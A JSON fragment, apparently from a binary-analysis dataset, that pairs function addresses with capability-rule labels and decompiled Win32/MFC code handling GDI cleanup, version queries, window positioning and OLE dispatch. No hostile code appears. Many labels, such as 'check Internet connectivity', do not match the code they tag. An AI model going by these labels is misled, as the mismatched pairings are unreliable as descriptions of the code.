        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041a206(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00458e45(0);\n    iVar1 = fcn.0042b82c();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.004170a2(0x431e1b);\n        iVar3 = fcn.004170b4(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004319cf(0x48b7e4, 0x41a19b, 0x4198e9, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar4;\n        fcn.004170a2(uVar2);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 323
    },
    "00431a77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00431a77(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00458e78(8);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((arg_8h_00 != 0) && (iVar1 = fcn.0043179d(arg_8h_00),  iVar1 == 0)) {\n        iVar1 = fcn.0043179d(arg_8h_00);\n        if (iVar1 == 0) {\n            uVar2 = fcn.004170a2(0x431e1b);\n            *(unaff_EBP + -4) = 0;\n            *(unaff_EBP + 8) = uVar2;\n            iVar1 = fcn.0044469c();\n            if (iVar1 == 0) {\n                fcn.00418fe6();\n            }\n            (**(extraout_ECX + 0x14))(iVar1);\n            piVar3 = fcn.0043194f(arg_8h_00);\n            uVar2 = *(unaff_EBP + 8);\n            *(unaff_EBP + -4) = 0xffffffff;\n            *piVar3 = iVar1;\n            fcn.004170a2(uVar2);\n            piVar3 = *(extraout_ECX + 0x58) + iVar1;\n            *piVar3 = arg_8h_00;\n            if (*(extraout_ECX + 0x5c) == 2) {\n                piVar3[1] = arg_8h_00;\n            }\n        }\n        else {\n            piVar3 = *(extraout_ECX + 0x58) + iVar1;\n            *piVar3 = arg_8h_00;\n            if (*(extraout_ECX + 0x5c) == 2) {\n                piVar3[1] = arg_8h_00;\n            }\n        }\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 517
    },
    "0041a302": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a302(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CDC.0;\n    if (param_1[1] != NULL) {\n        uVar1 = fcn.0041a2bb();\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0041a4cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041a4cd(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00458e45(0);\n    iVar1 = fcn.0042b82c();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.004170a2(0x431e1b);\n        iVar3 = fcn.004170b4(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004319cf(0x48b854, 0x41a1b7, 0x4198f7, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar4;\n        fcn.004170a2(uVar2);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 321
    },
    "0041a5a2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041a5a2(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.0041a578();\n    uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 90
    },
    "0041b5fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041b5fd(void)\n\n{\n    uint *arg_8h;\n    uint lpVersionInformation;\n    uint var_94h;\n    uint var_88h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.00459330(&var_94h, 0, 0x90);\n    arg_8h = &lpVersionInformation;\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 145
    },
    "0041b792": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b792(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.0041b655();\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar2 == 0) {\n        if (((arg_10h & 3) == 0) &&\n           ((((arg_8h < 0 || (iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0),  iVar2 <= arg_8h)) || (arg_ch < 0)) ||\n            (iVar2 = (*pcVar1)(1),  iVar2 <= arg_ch)))) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = 0x12340042;\n        }\n    }\n    else {\n        uVar3 = (**0x4acfd4)(arg_8h, arg_ch, arg_10h);\n    }\n    return uVar3;\n}\n",
        "token_count": 240
    },
    "0041ba23": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ba23(int32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0041b655();\n    if (iVar1 == 0) {\n        if ((arg_8h == 0) && (arg_ch == 0)) {\n            if ((arg_10h == NULL) || (*arg_10h < 0x1a8)) {\n                uVar2 = 0;\n            }\n            else {\n                fcn.004593aa(arg_10h + 1, 0x20, \"DISPLAY\", 0x1f);\n                fcn.004593aa(arg_10h + 9, 0x80, \"DISPLAY\", 0x1f);\n                arg_10h[0x29] = 5;\n                uVar2 = 1;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n        return uVar2;\n    }\n    // WARNING: Could not recover jumptable at 0x0041ba30. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar2 = (**0x4acfe0)();\n    return uVar2;\n}\n",
        "token_count": 288
    },
    "0041ba95": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0041ba95(int32_t *arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint32_t arg_18h, uint32_t *arg_1ch, \n            uint *arg_20h, uint noname_7, uint *arg_28h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    uint32_t *puVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t *piVar10;\n    uint var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_34h;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    int32_t pvargDest;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = arg_1ch;\n    piVar5 = arg_8h;\n    iVar9 = 0;\n    var_20h._0_2_ = 0;\n    if (arg_8h == NULL) {\n        return -0x7ff8ffa9;\n    }\n    if (arg_1ch == NULL) {\n        return -0x7ffdfff8;\n    }\n    uVar2 = arg_1ch[2];\n    if (5 < uVar2) {\n        return -0x7ffdfff2;\n    }\n    arg_8h = NULL;\n    if (arg_1ch[3] != 0) {\n        arg_1ch = arg_1ch[1];\n        do {\n            uVar3 = *arg_1ch;\n            if (uVar2 <= uVar3) {\n                return -0x7ffdfff2;\n            }\n            arg_1ch = arg_1ch + 1;\n            arg_8h = arg_8h + 1;\n            (&var_44h)[uVar3] = *puVar6 + iVar9;\n            iVar9 = iVar9 + 0x10;\n        } while (arg_8h < puVar6[3]);\n    }\n    if (arg_8h < uVar2) {\n        iVar9 = arg_8h * 0x10 + *puVar6;\n        iVar8 = uVar2 - arg_8h;\n        piVar10 = &var_48h + (uVar2 - arg_8h);\n        do {\n            *piVar10 = iVar9;\n            iVar9 = iVar9 + 0x10;\n            piVar10 = piVar10 + -1;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar9 = -0x7ffdfffd;\n    if (arg_28h == NULL) {\n        arg_28h = &arg_18h;\n    }\n    if (arg_20h == NULL) {\n        arg_20h = &var_20h;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvargDest);\n    pcVar4 = _sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime;\n    if (0x12 < arg_ch + 0x139aU) goto code_r0x0041bfff;\n    // switch table (19 cases) at 0x41c015\n    switch(*((arg_ch + 0x139aU) * 4 + 0x41c015)) {\n    case 0x41bb72:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 100))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3]);\n            goto code_r0x0041bfff;\n        }\n        break;\n    case 0x41bb93:\n        if (puVar6[2] == 2) {\n            if (*var_44h != 3) {\n                iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_44h, 0, 3);\n                if (iVar9 < 0) goto code_r0x0041bd8b;\n                var_44h = &pvargDest;\n            }\n            arg_18h = var_44h[2];\n            if (*var_40h != 3) {\n                iVar9 = (*pcVar4)(&pvargDest, var_40h, 0, 3);\n                if (iVar9 < 0) {\ncode_r0x0041bf77:\n                    *arg_28h = 1;\n                    goto code_r0x0041bfff;\n                }\n                var_40h = &pvargDest;\n            }\n            iVar9 = (**(*piVar5 + 0x60))(piVar5, arg_18h, var_40h[2], arg_20h);\n            goto code_r0x0041bfff;\n        }\n        break;\n    case 0x41bc00:\n        if (puVar6[2] == 2) {\n            if (*var_44h != 3) {\n                iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_44h, 0, 3);\n                if (iVar9 < 0) goto code_r0x0041bd8b;\n                var_44h = &pvargDest;\n            }\n            iVar9 = (**(*piVar5 + 0x5c))(piVar5, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h);\n            goto code_r0x0041bfff;\n        }\n        break;\n    case 0x41bc4d:\n        if (puVar6[2] == 5) {\n            while ((uVar1 = *var_44h,  (uVar1 & 0x4000) != 0 && ((uVar1 & 0xf) != 0))) {\n                if ((uVar1 & 0xc) == 0) {\n                    pvargDest = var_44h[2];\n                }\n                else {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h[2]);\n                    *var_44h[2] = 3;\n                    pvargDest = var_44h[2] + 8;\n                }\n            }\n            *arg_28h = 0;\n            iVar9 = (**(*piVar5 + 0x58))\n                              (piVar5, pvargDest, var_ch, var_8h, var_4h, *var_34h, var_34h[1], var_34h[2], var_34h[3]);\n            goto code_r0x0041bfff;\n        }\n        break;\n    case 0x41bcb6:\n        if (puVar6[2] == 2) {\n            if (*var_44h != 3) {\n                iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_44h, 0, 3);\n                if (iVar9 < 0) goto code_r0x0041bd8b;\n                var_44h = &pvargDest;\n            }\n            iVar9 = (**(*piVar5 + 0x54))(piVar5, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3]);\n            goto code_r0x0041bfff;\n        }\n        break;\n    case 0x41bd00:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x50))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\ncode_r0x0041bf2e:\n            if (-1 < iVar9) {\n                *arg_20h = 8;\n            }\n            goto code_r0x0041bfff;\n        }\n        break;\n    case 0x41bd28:\n        iVar9 = (**(*piVar5 + 0x4c))(piVar5, arg_20h);\n        goto code_r0x0041bfff;\n    case 0x41bd36:\n        iVar9 = (**(*piVar5 + 0x48))(piVar5, arg_20h);\n        goto code_r0x0041bfff;\n    case 0x41bd44:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x44))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0041bf2e;\n        }\n        break;\n    case 0x41bd6c:\n        if (puVar6[2] == 2) {\n            uVar1 = *var_44h;\n            if (((uVar1 & 0x4000) != 0) && ((uVar1 & 0xc) == 0)) {\n                iVar9 = -0x7ffdfffb;\ncode_r0x0041bd8b:\n                *arg_28h = 0;\n                goto code_r0x0041bfff;\n            }\n            if (uVar1 == 0x400c) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h[2]);\n                *var_44h[2] = 8;\n                puVar7 = var_44h[2] + 8;\n            }\n            else if (uVar1 == 0x4008) {\n                puVar7 = var_44h[2];\n            }\n            else {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h);\n                puVar7 = var_44h + 2;\n                *var_44h = 8;\n            }\n            iVar9 = (**(*piVar5 + 0x40))(piVar5, puVar7, *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h + 2);\n            goto code_r0x0041bfd4;\n        }\n        break;\n    case 0x41bdee:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x3c))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0041bf2e;\n        }\n        break;\n    case 0x41be16:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x38))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x0041bfff;\n        }\n        break;\n    case 0x41be3a:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x34))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x0041bfff;\n        }\n        break;\n    case 0x41be5e:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x30))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0041bf2e;\n        }\n        break;\n    case 0x41be86:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x0041bf07;\n            if (puVar6[2] == 2) {\n                var_30h = *var_44h;\n                uStack48 = var_44h[1];\n                uStack44 = var_44h[2];\n                uStack40 = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_40h, 0, 3);\n                    if (iVar9 < 0) goto code_r0x0041bf77;\n                    var_40h = &pvargDest;\n                }\n                iVar9 = (**(*piVar5 + 0x6c))(piVar5, var_30h, uStack48, uStack44, uStack40, var_40h[2]);\n                goto code_r0x0041bfff;\n            }\n        }\n        else if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x2c))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0041bf2e;\n        }\n        break;\n    case 0x41bf07:\ncode_r0x0041bf07:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x0041bf9f;\n            if (puVar6[2] == 2) {\n                var_30h = *var_44h;\n                uStack48 = var_44h[1];\n                uStack44 = var_44h[2];\n                uStack40 = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_40h, 0, 3);\n                    if (iVar9 < 0) goto code_r0x0041bf77;\n                    var_40h = &pvargDest;\n                }\n                iVar9 = (**(*piVar5 + 0x68))(piVar5, var_30h, uStack48, uStack44, uStack40, var_40h[2]);\n                goto code_r0x0041bfff;\n            }\n        }\n        else if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x28))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0041bf2e;\n        }\n        break;\n    case 0x41bf9f:\ncode_r0x0041bf9f:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x24))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0041bff1;\n        }\n        break;\n    case 0x41bfc7:\n        iVar9 = (**(*piVar5 + 0x20))(piVar5, arg_20h + 2);\ncode_r0x0041bfd4:\n        if (-1 < iVar9) {\n            *arg_20h = 3;\n        }\n        goto code_r0x0041bfff;\n    case 0x41bfe4:\n        iVar9 = (**(*piVar5 + 0x1c))(piVar5, arg_20h + 2);\ncode_r0x0041bff1:\n        if (-1 < iVar9) {\n            *arg_20h = 9;\n        }\n        goto code_r0x0041bfff;\n    }\n    iVar9 = -0x7ffdfff2;\ncode_r0x0041bfff:\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&pvargDest);\n    return iVar9;\n}\n",
        "token_count": 3784
    },
    "0041c061": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041c061(uint noname_0, int32_t arg_ch, uint32_t arg_10h, uint noname_3, int32_t arg_18h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_1h;\n    \n    uVar3 = 0;\n    if (arg_10h != 0) {\n        do {\n            bVar1 = false;\n            uVar4 = 0;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*(arg_ch + uVar3 * 4), *(uVar4 + 0x4a8870));\n                if (iVar2 == 0) {\n                    bVar1 = true;\n                    *(arg_18h + uVar3 * 4) = *(uVar4 + 0x4a8820);\n                }\n                uVar4 = uVar4 + 4;\n            } while (uVar4 < 0x4c);\n            if (!bVar1) {\n                return 0x80020006;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 305
    },
    "0041c2bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041c2bc(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 169
    },
    "0041c3fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041c3fa(int32_t *param_1, int32_t param_2, uint *param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1[8];\n    if (param_2 != 2) {\n        iVar1 = (**(*param_1 + 0x70))(param_2);\n        if (iVar1 != 0) {\n            iVar2 = *(iVar1 + 0x20);\n            param_2 = 2;\n        }\n    }\n    *param_3 = 0x1c;\n    param_3[1] = param_4;\n    (*_sym.imp.USER32.dll_GetScrollInfo)(iVar2, param_2, param_3);\n    return;\n}\n",
        "token_count": 181
    },
    "0041c437": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c437(int32_t *arg_8h, uint hWnd, int32_t *lprc2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpRect;\n    uint var_8h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(hWnd);\n    if ((arg_8h == NULL) || (*arg_8h != 0)) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n        pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n        (*_sym.imp.USER32.dll_ScreenToClient)(uVar2, &lpRect);\n        (*pcVar1)(uVar2, &var_8h);\n        iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&lpRect, lprc2);\n        if (iVar3 == 0) {\n            if (arg_8h == NULL) {\n                (*_sym.imp.USER32.dll_SetWindowPos)\n                          (hWnd, 0, *lprc2, lprc2[1], lprc2[2] - *lprc2, lprc2[3] - lprc2[1], 0x14);\n            }\n            else {\n                iVar3 = (*_sym.imp.USER32.dll_DeferWindowPos)(*arg_8h);\n                *arg_8h = iVar3;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "0041c80d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c80d(int32_t hdc, uint arg_ch, int32_t arg_10h, int32_t hgdiobj, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpvObject;\n    uint crColor;\n    \n    if ((((hdc == 0) || (hgdiobj == 0)) || (arg_10h == 1)) || ((arg_10h == 0 || (arg_10h == 5)))) {\ncode_r0x0041c87c:\n        uVar2 = 0;\n    }\n    else {\n        if (arg_10h == 2) {\n            iVar1 = fcn.00431f07(arg_ch, 2);\n            if (iVar1 == 0) goto code_r0x0041c87c;\n        }\n        (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0xc, &lpvObject);\n        (*_sym.imp.GDI32.dll_SetBkColor)(hdc, crColor);\n        if (arg_18h == -1) {\n            arg_18h = (*_sym.imp.USER32.dll_GetSysColor)(8);\n        }\n        (*_sym.imp.GDI32.dll_SetTextColor)(hdc, arg_18h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 308
    },
    "0041ca50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041ca50(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0041cae6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041cae6(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0041cb7a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041cb7a(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "0041cc29": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
